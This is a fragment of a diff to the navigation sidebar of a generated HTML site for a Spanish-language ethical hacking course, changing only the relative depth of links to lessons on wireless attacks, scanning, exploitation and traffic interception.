+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/02.-Mi%20primera%20m%C3%A1quina%20vulnerable%20%28boot2root%29%20DC-1/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2439,7 +2439,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/03.-Actividades%20finales/" class="md-nav__link ">
+            <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/03.-Actividades%20finales/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2472,7 +2472,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/03.-Actividades%20finales/01.-De%20comprobaci%C3%B3n/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/03.-Actividades%20finales/01.-De%20comprobaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2493,7 +2493,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/03.-Actividades%20finales/02.-De%20aplicaci%C3%B3n/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/03.-Actividades%20finales/02.-De%20aplicaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2514,7 +2514,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/03.-Actividades%20finales/03.-De%20ampliaci%C3%B3n/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/03.-Actividades%20finales/03.-De%20ampliaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2543,7 +2543,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/04.-Laboratorios%20de%20Introducci%C3%B3n%20al%20hacking%20en%20Tryhackme/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/04.-Laboratorios%20de%20Introducci%C3%B3n%20al%20hacking%20en%20Tryhackme/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2606,7 +2606,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/04.-Soluci%C3%B3n/Informe_Auditoria_Seguridad_Fernandez_Automocion/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/04.-Soluci%C3%B3n/Informe_Auditoria_Seguridad_Fernandez_Automocion/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2635,7 +2635,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/05.-Fichero%20de%20configuraci%C3%B3n%20de%20Tmux/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/05.-Fichero%20de%20configuraci%C3%B3n%20de%20Tmux/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2687,7 +2687,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/" class="md-nav__link ">
+            <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2753,7 +2753,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/" class="md-nav__link ">
+            <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2786,7 +2786,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/01.-%20Dise%C3%B1ar%20el%20plan%20de%20auditor%C3%ADa/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/01.-%20Dise%C3%B1ar%20el%20plan%20de%20auditor%C3%ADa/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2807,7 +2807,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/02.-Organiza%20las%20fases%20de%20la%20auditor%C3%ADa/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/02.-Organiza%20las%20fases%20de%20la%20auditor%C3%ADa/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2828,7 +2828,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/03.-Presentaci%C3%B3n%20y%20valoraci%C3%B3n%20de%20vulnerabilidades/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/03.-Presentaci%C3%B3n%20y%20valoraci%C3%B3n%20de%20vulnerabilidades/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2849,7 +2849,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/04.-Informaci%C3%B3n%20de%20inter%C3%A9s/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/04.-Informaci%C3%B3n%20de%20inter%C3%A9s/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2870,7 +2870,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/05.-Entrega/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/05.-Entrega/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2891,7 +2891,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/06.-Soluci%C3%B3n/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/08.-Ejercicio%20para%20entregar/01.-Actividades/06.-Soluci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2966,7 +2966,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/" class="md-nav__link ">
+            <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -3032,7 +3032,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/" class="md-nav__link ">
+            <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -3065,7 +3065,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/01.-Diferencias%20entre%20bandas%20de%20frecuencia/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/01.-Diferencias%20entre%20bandas%20de%20frecuencia/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3086,7 +3086,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/02.-Componentes%20de%20una%20Red%20inal%C3%A1mbrica/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/02.-Componentes%20de%20una%20Red%20inal%C3%A1mbrica/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3107,7 +3107,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/03.-Terminolog%C3%ADa%20Redes%20WiFi/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/03.-Terminolog%C3%ADa%20Redes%20WiFi/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3128,7 +3128,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/04.-Tipos%20Redes%20Inalambricas/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/04.-Tipos%20Redes%20Inalambricas/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3149,7 +3149,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/05.-Equipamiento%20Hacking%20Inal%C3%A1mbrico/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/05.-Equipamiento%20Hacking%20Inal%C3%A1mbrico/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3170,7 +3170,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/06.-Modos%20Operaci%C3%B3n%20tarjetas%20WiFi/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/01.-Conceptos%20generales%20de%20HE%20en%20entornos%20inal%C3%A1mbricos/06.-Modos%20Operaci%C3%B3n%20tarjetas%20WiFi/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3226,7 +3226,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/02.-An%C3%A1lisis%20y%20recolecci%C3%B3n%20de%20datos%20en%20redes%20inal%C3%A1mbricas/" class="md-nav__link ">
+            <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/02.-An%C3%A1lisis%20y%20recolecci%C3%B3n%20de%20datos%20en%20redes%20inal%C3%A1mbricas/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -3259,7 +3259,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/02.-An%C3%A1lisis%20y%20recolecci%C3%B3n%20de%20datos%20en%20redes%20inal%C3%A1mbricas/01.-Necesidades%20T%C3%A9cnicas%20para%20la%20Monitorizaci%C3%B3n/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/02.-An%C3%A1lisis%20y%20recolecci%C3%B3n%20de%20datos%20en%20redes%20inal%C3%A1mbricas/01.-Necesidades%20T%C3%A9cnicas%20para%20la%20Monitorizaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3280,7 +3280,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/02.-An%C3%A1lisis%20y%20recolecci%C3%B3n%20de%20datos%20en%20redes%20inal%C3%A1mbricas/02.-Modo%20Monitor%20de%20la%20NIC/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/02.-An%C3%A1lisis%20y%20recolecci%C3%B3n%20de%20datos%20en%20redes%20inal%C3%A1mbricas/02.-Modo%20Monitor%20de%20la%20NIC/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3301,7 +3301,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/02.-An%C3%A1lisis%20y%20recolecci%C3%B3n%20de%20datos%20en%20redes%20inal%C3%A1mbricas/03.-Monitorizando%20la%20red%20inal%C3%A1mbrica/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/02.-An%C3%A1lisis%20y%20recolecci%C3%B3n%20de%20datos%20en%20redes%20inal%C3%A1mbricas/03.-Monitorizando%20la%20red%20inal%C3%A1mbrica/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3359,7 +3359,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/" class="md-nav__link ">
+            <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -3392,7 +3392,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/01.-Ataques%20a%20redes%20OPEN/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/01.-Ataques%20a%20redes%20OPEN/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3413,7 +3413,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/02.-Ataques%20a%20redes%20WEP/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/02.-Ataques%20a%20redes%20WEP/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3434,7 +3434,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/03.-Ataques%20Redes%20WPA-WPA2_PSK/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/03.-Ataques%20Redes%20WPA-WPA2_PSK/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3455,7 +3455,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/04.-Ataques%20Redes%20WPA%20WPA2%20Enterprise/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/03.-Ataques%20a%20redes%20inal%C3%A1mbricas/04.-Ataques%20Redes%20WPA%20WPA2%20Enterprise/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3484,7 +3484,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/04.-Reporting%20%28Generaci%C3%B3n%20de%20Informes%29/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/04.-Reporting%20%28Generaci%C3%B3n%20de%20Informes%29/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3528,7 +3528,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/05.-Pr%C3%A1cticas/" class="md-nav__link ">
+            <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/05.-Pr%C3%A1cticas/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -3561,7 +3561,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/05.-Pr%C3%A1cticas/01.-Revisi%C3%B3n%20del%20dise%C3%B1o%20de%20la%20red%20Wi-Fi/" class="md-nav__link">
+      <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/05.-Pr%C3%A1cticas/01.-Revisi%C3%B3n%20del%20dise%C3%B1o%20de%20la%20red%20Wi-Fi/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3632,7 +3632,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/" class="md-nav__link ">
+            <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -3692,7 +3692,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/01.-Fase%20de%20reconocimiento%20%28Footprinting%29/" class="md-nav__link ">
+            <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/01.-Fase%20de%20reconocimiento%20%28Footprinting%29/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -3725,7 +3725,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/01.-Fase%20de%20reconocimiento%20%28Footprinting%29/01.-Tipos%20de%20reconocimiento/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/01.-Fase%20de%20reconocimiento%20%28Footprinting%29/01.-Tipos%20de%20reconocimiento/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3746,7 +3746,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/01.-Fase%20de%20reconocimiento%20%28Footprinting%29/02.-Reconocimiento%20pasivo/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/01.-Fase%20de%20reconocimiento%20%28Footprinting%29/02.-Reconocimiento%20pasivo/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3767,7 +3767,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/01.-Fase%20de%20reconocimiento%20%28Footprinting%29/03.-Reconocimiento%20activo/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/01.-Fase%20de%20reconocimiento%20%28Footprinting%29/03.-Reconocimiento%20activo/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3829,7 +3829,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/" class="md-nav__link ">
+            <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -3862,7 +3862,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/01.-Tipos%20y%20enfoque%20de%20los%20escaneos/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/01.-Tipos%20y%20enfoque%20de%20los%20escaneos/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3883,7 +3883,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/02.-Escaneo%20de%20red/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/02.-Escaneo%20de%20red/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3904,7 +3904,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/03.-Escaneo%20de%20servicios/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/03.-Escaneo%20de%20servicios/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3925,7 +3925,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/04.-Escaneo%20de%20vulnerabilidades/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/04.-Escaneo%20de%20vulnerabilidades/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3946,7 +3946,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/05.-Opciones%20Avanzadas%20de%20Nmap/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/05.-Opciones%20Avanzadas%20de%20Nmap/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3967,7 +3967,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/06.-Herramientas%20adicionales%20de%20b%C3%BAsqueda%20de%20vulnerabilidades/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/02.-Fase%20de%20escaneo%20%28Fingerprinting%29/06.-Herramientas%20adicionales%20de%20b%C3%BAsqueda%20de%20vulnerabilidades/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4027,7 +4027,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/" class="md-nav__link ">
+            <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -4060,7 +4060,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/01.-Vectores%20de%20Ataque/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/01.-Vectores%20de%20Ataque/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4081,7 +4081,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/02.-Concepto%20de%20Exploit/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/02.-Concepto%20de%20Exploit/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4102,7 +4102,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/03.-Concepto%20de%20Payload/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/03.-Concepto%20de%20Payload/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4123,7 +4123,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/04.-Herramienta%20%60metasploit%60/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/04.-Herramienta%20%60metasploit%60/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4144,7 +4144,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/05.-Herramienta%20%60msfvenom%60/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/03.-Fase%20de%20explotaci%C3%B3n%20de%20vulnerabilidades%20%28Exploitation%29/05.-Herramienta%20%60msfvenom%60/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4198,7 +4198,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/04.-Intercepci%C3%B3n%2C%20manipulaci%C3%B3n%20y%20monitoriazaci%C3%B3n%20del%20tr%C3%A1fico/" class="md-nav__link ">
+            <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/04.-Intercepci%C3%B3n%2C%20manipulaci%C3%B3n%20y%20monitoriazaci%C3%B3n%20del%20tr%C3%A1fico/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -4231,7 +4231,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/04.-Intercepci%C3%B3n%2C%20manipulaci%C3%B3n%20y%20monitoriazaci%C3%B3n%20del%20tr%C3%A1fico/01.-Introducci%C3%B3n/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/04.-Intercepci%C3%B3n%2C%20manipulaci%C3%B3n%20y%20monitoriazaci%C3%B3n%20del%20tr%C3%A1fico/01.-Introducci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4252,7 +4252,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/04.-Intercepci%C3%B3n%2C%20manipulaci%C3%B3n%20y%20monitoriazaci%C3%B3n%20del%20tr%C3%A1fico/02.-Manipulaci%C3%B3n%20e%20inyecci%C3%B3n%20de%20tr%C3%A1fico/" class="md-nav__link">
